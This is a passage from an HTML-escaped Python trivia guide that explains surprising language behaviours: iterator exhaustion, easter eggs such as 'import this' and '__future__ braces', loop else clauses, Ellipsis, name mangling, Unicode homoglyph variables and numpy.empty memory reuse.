&lt;code&gt;sorted&lt;/code&gt;, the &lt;code&gt;reversed&lt;/code&gt; method returns an iterator. Why? Because sorting requires the iterator to be either modified in-place or use an extra container (a list), whereas reversing can simply work by iterating from the last index to the first.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So during comparison &lt;code&gt;sorted(y) == sorted(y)&lt;/code&gt;, the first call to &lt;code&gt;sorted()&lt;/code&gt; will consume the iterator &lt;code&gt;y&lt;/code&gt;, and the next call will just return an empty list.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = 7, 8, 9&#xA;&amp;gt;&amp;gt;&amp;gt; y = reversed(x)&#xA;&amp;gt;&amp;gt;&amp;gt; sorted(y), sorted(y)&#xA;([7, 8, 9], [])&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Midnight time doesn&#39;t exist?&lt;/h3&gt; &#xA;&lt;!-- Example ID: 1bce8294-5619-4d70-8ce3-fe0bade690d1 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from datetime import datetime&#xA;&#xA;midnight = datetime(2018, 1, 1, 0, 0)&#xA;midnight_time = midnight.time()&#xA;&#xA;noon = datetime(2018, 1, 1, 12, 0)&#xA;noon_time = noon.time()&#xA;&#xA;if midnight_time:&#xA;    print(&#34;Time at midnight is&#34;, midnight_time)&#xA;&#xA;if noon_time:&#xA;    print(&#34;Time at noon is&#34;, noon_time)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;lt; 3.5):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;(&#39;Time at noon is&#39;, datetime.time(12, 0))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The midnight time is not printed.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;p&gt;Before Python 3.5, the boolean value for &lt;code&gt;datetime.time&lt;/code&gt; object was considered to be &lt;code&gt;False&lt;/code&gt; if it represented midnight in UTC. It is error-prone when using the &lt;code&gt;if obj:&lt;/code&gt; syntax to check if the &lt;code&gt;obj&lt;/code&gt; is null or some equivalent of &#34;empty.&#34;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Section: The Hidden treasures!&lt;/h2&gt; &#xA;&lt;p&gt;This section contains a few lesser-known and interesting things about Python that most beginners like me are unaware of (well, not anymore).&lt;/p&gt; &#xA;&lt;h3&gt;▶ Okay Python, Can you make me fly?&lt;/h3&gt; &#xA;&lt;!-- Example ID: a92f3645-1899-4d50-9721-0031be4aec3f ---&gt; &#xA;&lt;p&gt;Well, here you go&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;import antigravity&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt; Sshh... It&#39;s a super-secret.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;antigravity&lt;/code&gt; module is one of the few easter eggs released by Python developers.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;import antigravity&lt;/code&gt; opens up a web browser pointing to the &lt;a href=&#34;https://xkcd.com/353/&#34;&gt;classic XKCD comic&lt;/a&gt; about Python.&lt;/li&gt; &#xA; &lt;li&gt;Well, there&#39;s more to it. There&#39;s &lt;strong&gt;another easter egg inside the easter egg&lt;/strong&gt;. If you look at the &lt;a href=&#34;https://github.com/python/cpython/raw/master/Lib/antigravity.py#L7-L17&#34;&gt;code&lt;/a&gt;, there&#39;s a function defined that purports to implement the &lt;a href=&#34;https://xkcd.com/426/&#34;&gt;XKCD&#39;s geohashing algorithm&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ &lt;code&gt;goto&lt;/code&gt;, but why?&lt;/h3&gt; &#xA;&lt;!-- Example ID: 2aff961e-7fa5-4986-a18a-9e5894bd89fe ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from goto import goto, label&#xA;for i in range(9):&#xA;    for j in range(9):&#xA;        for k in range(9):&#xA;            print(&#34;I am trapped, please rescue!&#34;)&#xA;            if k == 2:&#xA;                goto .breakout # breaking out from a deeply nested loop&#xA;label .breakout&#xA;print(&#34;Freedom!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.3):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;I am trapped, please rescue!&#xA;I am trapped, please rescue!&#xA;Freedom!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A working version of &lt;code&gt;goto&lt;/code&gt; in Python was &lt;a href=&#34;https://mail.python.org/pipermail/python-announce-list/2004-April/002982.html&#34;&gt;announced&lt;/a&gt; as an April Fool&#39;s joke on 1st April 2004.&lt;/li&gt; &#xA; &lt;li&gt;Current versions of Python do not have this module.&lt;/li&gt; &#xA; &lt;li&gt;Although it works, but please don&#39;t use it. Here&#39;s the &lt;a href=&#34;https://docs.python.org/3/faq/design.html#why-is-there-no-goto&#34;&gt;reason&lt;/a&gt; to why &lt;code&gt;goto&lt;/code&gt; is not present in Python.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Brace yourself!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 5c0c75f2-ddd9-4da3-ba49-c4be7ec39acf ---&gt; &#xA;&lt;p&gt;If you are one of the people who doesn&#39;t like using whitespace in Python to denote scopes, you can use the C-style {} by importing,&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from __future__ import braces&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;  File &#34;some_file.py&#34;, line 1&#xA;    from __future__ import braces&#xA;SyntaxError: not a chance&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Braces? No way! If you think that&#39;s disappointing, use Java. Okay, another surprising thing, can you find where&#39;s the &lt;code&gt;SyntaxError&lt;/code&gt; raised in &lt;code&gt;__future__&lt;/code&gt; module &lt;a href=&#34;https://github.com/python/cpython/raw/master/Lib/__future__.py&#34;&gt;code&lt;/a&gt;?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The &lt;code&gt;__future__&lt;/code&gt; module is normally used to provide features from future versions of Python. The &#34;future&#34; in this specific context is however, ironic.&lt;/li&gt; &#xA; &lt;li&gt;This is an easter egg concerned with the community&#39;s feelings on this issue.&lt;/li&gt; &#xA; &lt;li&gt;The code is actually present &lt;a href=&#34;https://github.com/python/cpython/raw/025eb98dc0c1dc27404df6c544fc2944e0fa9f3a/Python/future.c#L49&#34;&gt;here&lt;/a&gt; in &lt;code&gt;future.c&lt;/code&gt; file.&lt;/li&gt; &#xA; &lt;li&gt;When the CPython compiler encounters a &lt;a href=&#34;https://docs.python.org/3.3/reference/simple_stmts.html#future-statements&#34;&gt;future statement&lt;/a&gt;, it first runs the appropriate code in &lt;code&gt;future.c&lt;/code&gt; before treating it as a normal import statement.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Let&#39;s meet Friendly Language Uncle For Life&lt;/h3&gt; &#xA;&lt;!-- Example ID: 6427fae6-e959-462d-85da-ce4c94ce41be ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; from __future__ import barry_as_FLUFL&#xA;&amp;gt;&amp;gt;&amp;gt; &#34;Ruby&#34; != &#34;Python&#34; # there&#39;s no doubt about it&#xA;  File &#34;some_file.py&#34;, line 1&#xA;    &#34;Ruby&#34; != &#34;Python&#34;&#xA;              ^&#xA;SyntaxError: invalid syntax&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; &#34;Ruby&#34; &amp;lt;&amp;gt; &#34;Python&#34;&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There we go.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;This is relevant to &lt;a href=&#34;https://www.python.org/dev/peps/pep-0401/&#34;&gt;PEP-401&lt;/a&gt; released on April 1, 2009 (now you know, what it means).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Quoting from the PEP-401&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;Recognized that the != inequality operator in Python 3.0 was a horrible, finger-pain inducing mistake, the FLUFL reinstates the &amp;lt;&amp;gt; diamond operator as the sole spelling.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;There were more things that Uncle Barry had to share in the PEP; you can read them &lt;a href=&#34;https://www.python.org/dev/peps/pep-0401/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;It works well in an interactive environment, but it will raise a &lt;code&gt;SyntaxError&lt;/code&gt; when you run via python file (see this &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/94&#34;&gt;issue&lt;/a&gt;). However, you can wrap the statement inside an &lt;code&gt;eval&lt;/code&gt; or &lt;code&gt;compile&lt;/code&gt; to get it working,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from __future__ import barry_as_FLUFL&#xA;print(eval(&#39;&#34;Ruby&#34; &amp;lt;&amp;gt; &#34;Python&#34;&#39;))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Even Python understands that love is complicated&lt;/h3&gt; &#xA;&lt;!-- Example ID: b93cad9e-d341-45d1-999c-fcdce65bed25 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;import this&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Wait, what&#39;s &lt;strong&gt;this&lt;/strong&gt;? &lt;code&gt;this&lt;/code&gt; is love &lt;span&gt;❤️&lt;/span&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;The Zen of Python, by Tim Peters&#xA;&#xA;Beautiful is better than ugly.&#xA;Explicit is better than implicit.&#xA;Simple is better than complex.&#xA;Complex is better than complicated.&#xA;Flat is better than nested.&#xA;Sparse is better than dense.&#xA;Readability counts.&#xA;Special cases aren&#39;t special enough to break the rules.&#xA;Although practicality beats purity.&#xA;Errors should never pass silently.&#xA;Unless explicitly silenced.&#xA;In the face of ambiguity, refuse the temptation to guess.&#xA;There should be one-- and preferably only one --obvious way to do it.&#xA;Although that way may not be obvious at first unless you&#39;re Dutch.&#xA;Now is better than never.&#xA;Although never is often better than *right* now.&#xA;If the implementation is hard to explain, it&#39;s a bad idea.&#xA;If the implementation is easy to explain, it may be a good idea.&#xA;Namespaces are one honking great idea -- let&#39;s do more of those!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It&#39;s the Zen of Python!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; love = this&#xA;&amp;gt;&amp;gt;&amp;gt; this is love&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; love is True&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; love is False&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; love is not True or False&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; love is not True or False; love is love  # Love is complicated&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;this&lt;/code&gt; module in Python is an easter egg for The Zen Of Python (&lt;a href=&#34;https://www.python.org/dev/peps/pep-0020&#34;&gt;PEP 20&lt;/a&gt;).&lt;/li&gt; &#xA; &lt;li&gt;And if you think that&#39;s already interesting enough, check out the implementation of &lt;a href=&#34;https://hg.python.org/cpython/file/c3896275c0f6/Lib/this.py&#34;&gt;this.py&lt;/a&gt;. Interestingly, &lt;strong&gt;the code for the Zen violates itself&lt;/strong&gt; (and that&#39;s probably the only place where this happens).&lt;/li&gt; &#xA; &lt;li&gt;Regarding the statement &lt;code&gt;love is not True or False; love is love&lt;/code&gt;, ironic but it&#39;s self-explanatory (if not, please see the examples related to &lt;code&gt;is&lt;/code&gt; and &lt;code&gt;is not&lt;/code&gt; operators).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Yes, it exists!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 4286db3d-1ea7-47c9-8fb6-a9a04cac6e49 ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;The &lt;code&gt;else&lt;/code&gt; clause for loops.&lt;/strong&gt; One typical example might be:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;  def does_exists_num(l, to_find):&#xA;      for num in l:&#xA;          if num == to_find:&#xA;              print(&#34;Exists!&#34;)&#xA;              break&#xA;      else:&#xA;          print(&#34;Does not exist&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_list = [1, 2, 3, 4, 5]&#xA;&amp;gt;&amp;gt;&amp;gt; does_exists_num(some_list, 4)&#xA;Exists!&#xA;&amp;gt;&amp;gt;&amp;gt; does_exists_num(some_list, -1)&#xA;Does not exist&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;The &lt;code&gt;else&lt;/code&gt; clause in exception handling.&lt;/strong&gt; An example,&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;try:&#xA;    pass&#xA;except:&#xA;    print(&#34;Exception occurred!!!&#34;)&#xA;else:&#xA;    print(&#34;Try block executed successfully...&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;Try block executed successfully...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The &lt;code&gt;else&lt;/code&gt; clause after a loop is executed only when there&#39;s no explicit &lt;code&gt;break&lt;/code&gt; after all the iterations. You can think of it as a &#34;nobreak&#34; clause.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;else&lt;/code&gt; clause after a try block is also called &#34;completion clause&#34; as reaching the &lt;code&gt;else&lt;/code&gt; clause in a &lt;code&gt;try&lt;/code&gt; statement means that the try block actually completed successfully.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Ellipsis *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 969b7100-ab3d-4a7d-ad7d-a6be16181b2b ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func():&#xA;    Ellipsis&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;# No output, No Error&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; SomeRandomString&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;NameError: name &#39;SomeRandomString&#39; is not defined&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; Ellipsis&#xA;Ellipsis&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;In Python, &lt;code&gt;Ellipsis&lt;/code&gt; is a globally available built-in object which is equivalent to &lt;code&gt;...&lt;/code&gt;. &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ...&#xA;Ellipsis&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;Ellipsis can be used for several purposes, &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;As a placeholder for code that hasn&#39;t been written yet (just like &lt;code&gt;pass&lt;/code&gt; statement)&lt;/li&gt; &#xA;   &lt;li&gt;In slicing syntax to represent the full slices in remaining direction&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; import numpy as np&#xA;&amp;gt;&amp;gt;&amp;gt; three_dimensional_array = np.arange(8).reshape(2, 2, 2)&#xA;array([&#xA;    [&#xA;        [0, 1],&#xA;        [2, 3]&#xA;    ],&#xA;&#xA;    [&#xA;        [4, 5],&#xA;        [6, 7]&#xA;    ]&#xA;])&#xA;&lt;/code&gt;&lt;/pre&gt; So our &lt;code&gt;three_dimensional_array&lt;/code&gt; is an array of array of arrays. Let&#39;s say we want to print the second element (index &lt;code&gt;1&lt;/code&gt;) of all the innermost arrays, we can use Ellipsis to bypass all the preceding dimensions &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; three_dimensional_array[:,:,1]&#xA;array([[1, 3],&#xA;   [5, 7]])&#xA;&amp;gt;&amp;gt;&amp;gt; three_dimensional_array[..., 1] # using Ellipsis.&#xA;array([[1, 3],&#xA;   [5, 7]])&#xA;&lt;/code&gt;&lt;/pre&gt; Note: this will work for any number of dimensions. You can even select slice in first and last dimension and ignore the middle ones this way (&lt;code&gt;n_dimensional_array[firs_dim_slice, ..., last_dim_slice]&lt;/code&gt;) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;In &lt;a href=&#34;https://docs.python.org/3/library/typing.html&#34;&gt;type hinting&lt;/a&gt; to indicate only a part of the type (like &lt;code&gt;(Callable[..., int]&lt;/code&gt; or &lt;code&gt;Tuple[str, ...]&lt;/code&gt;))&lt;/li&gt; &#xA;   &lt;li&gt;You may also use Ellipsis as a default function argument (in the cases when you want to differentiate between the &#34;no argument passed&#34; and &#34;None value passed&#34; scenarios).&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Inpinity&lt;/h3&gt; &#xA;&lt;!-- Example ID: ff473ea8-a3b1-4876-a6f0-4378aff790c1 ---&gt; &#xA;&lt;p&gt;The spelling is intended. Please, don&#39;t submit a patch for this.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; infinity = float(&#39;infinity&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; hash(infinity)&#xA;314159&#xA;&amp;gt;&amp;gt;&amp;gt; hash(float(&#39;-inf&#39;))&#xA;-314159&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hash of infinity is 10⁵ x π.&lt;/li&gt; &#xA; &lt;li&gt;Interestingly, the hash of &lt;code&gt;float(&#39;-inf&#39;)&lt;/code&gt; is &#34;-10⁵ x π&#34; in Python 3, whereas &#34;-10⁵ x e&#34; in Python 2.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Let&#39;s mangle&lt;/h3&gt; &#xA;&lt;!-- Example ID: 37146d2d-9e67-43a9-8729-3c17934b910c ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class Yo(object):&#xA;    def __init__(self):&#xA;        self.__honey = True&#xA;        self.bro = True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; Yo().bro&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; Yo().__honey&#xA;AttributeError: &#39;Yo&#39; object has no attribute &#39;__honey&#39;&#xA;&amp;gt;&amp;gt;&amp;gt; Yo()._Yo__honey&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class Yo(object):&#xA;    def __init__(self):&#xA;        # Let&#39;s try something symmetrical this time&#xA;        self.__honey__ = True&#xA;        self.bro = True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; Yo().bro&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; Yo()._Yo__honey__&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;AttributeError: &#39;Yo&#39; object has no attribute &#39;_Yo__honey__&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Why did &lt;code&gt;Yo()._Yo__honey&lt;/code&gt; work?&lt;/p&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;_A__variable = &#34;Some value&#34;&#xA;&#xA;class A(object):&#xA;    def some_func(self):&#xA;        return __variable # not initialized anywhere yet&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; A().__variable&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;AttributeError: &#39;A&#39; object has no attribute &#39;__variable&#39;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; A().some_func()&#xA;&#39;Some value&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Name_mangling&#34;&gt;Name Mangling&lt;/a&gt; is used to avoid naming collisions between different namespaces.&lt;/li&gt; &#xA; &lt;li&gt;In Python, the interpreter modifies (mangles) the class member names starting with &lt;code&gt;__&lt;/code&gt; (double underscore a.k.a &#34;dunder&#34;) and not ending with more than one trailing underscore by adding &lt;code&gt;_NameOfTheClass&lt;/code&gt; in front.&lt;/li&gt; &#xA; &lt;li&gt;So, to access &lt;code&gt;__honey&lt;/code&gt; attribute in the first snippet, we had to append &lt;code&gt;_Yo&lt;/code&gt; to the front, which would prevent conflicts with the same name attribute defined in any other class.&lt;/li&gt; &#xA; &lt;li&gt;But then why didn&#39;t it work in the second snippet? Because name mangling excludes the names ending with double underscores.&lt;/li&gt; &#xA; &lt;li&gt;The third snippet was also a consequence of name mangling. The name &lt;code&gt;__variable&lt;/code&gt; in the statement &lt;code&gt;return __variable&lt;/code&gt; was mangled to &lt;code&gt;_A__variable&lt;/code&gt;, which also happens to be the name of the variable we declared in the outer scope.&lt;/li&gt; &#xA; &lt;li&gt;Also, if the mangled name is longer than 255 characters, truncation will happen.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Section: Appearances are deceptive!&lt;/h2&gt; &#xA;&lt;h3&gt;▶ Skipping lines?&lt;/h3&gt; &#xA;&lt;!-- Example ID: d50bbde1-fb9d-4735-9633-3444b9d2f417 ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; value = 11&#xA;&amp;gt;&amp;gt;&amp;gt; valuе = 32&#xA;&amp;gt;&amp;gt;&amp;gt; value&#xA;11&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Wut?&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The easiest way to reproduce this is to simply copy the statements from the above snippet and paste them into your file/shell.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;p&gt;Some non-Western characters look identical to letters in the English alphabet but are considered distinct by the interpreter.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ord(&#39;е&#39;) # cyrillic &#39;e&#39; (Ye)&#xA;1077&#xA;&amp;gt;&amp;gt;&amp;gt; ord(&#39;e&#39;) # latin &#39;e&#39;, as used in English and typed using standard keyboard&#xA;101&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;е&#39; == &#39;e&#39;&#xA;False&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; value = 42 # latin e&#xA;&amp;gt;&amp;gt;&amp;gt; valuе = 23 # cyrillic &#39;e&#39;, Python 2.x interpreter would raise a `SyntaxError` here&#xA;&amp;gt;&amp;gt;&amp;gt; value&#xA;42&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The built-in &lt;code&gt;ord()&lt;/code&gt; function returns a character&#39;s Unicode &lt;a href=&#34;https://en.wikipedia.org/wiki/Code_point&#34;&gt;code point&lt;/a&gt;, and different code positions of Cyrillic &#39;e&#39; and Latin &#39;e&#39; justify the behavior of the above example.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Teleportation&lt;/h3&gt; &#xA;&lt;!-- Example ID: edafe923-0c20-4315-b6e1-0c31abfc38f5 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# `pip install numpy` first.&#xA;import numpy as np&#xA;&#xA;def energy_send(x):&#xA;    # Initializing a numpy array&#xA;    np.array([float(x)])&#xA;&#xA;def energy_receive():&#xA;    # Return an empty numpy array&#xA;    return np.empty((), dtype=np.float).tolist()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; energy_send(123.456)&#xA;&amp;gt;&amp;gt;&amp;gt; energy_receive()&#xA;123.456&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where&#39;s the Nobel Prize?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Notice that the numpy array created in the &lt;code&gt;energy_send&lt;/code&gt; function is not returned, so that memory space is free to reallocate.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;numpy.empty()&lt;/code&gt; returns the next free memory slot without reinitializing it. This memory spot just happens to be the same one that was just freed (usually, but not always).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Well, something is fishy...&lt;/h3&gt; &#xA;&lt;!-- Example ID: cb6a37c5-74f7-44ca-b58c-3b902419b362 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def square(x):&#xA;    &#34;&#34;&#34;&#xA;    A simple function to calculate the square of a number by addition.&#xA;    &#34;&#34;&#34;&#xA;    sum_so_far = 0&#xA;    for counter in range(x):&#xA;        sum_so_far = sum_so_far + x&#xA;  return sum_so_far&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code 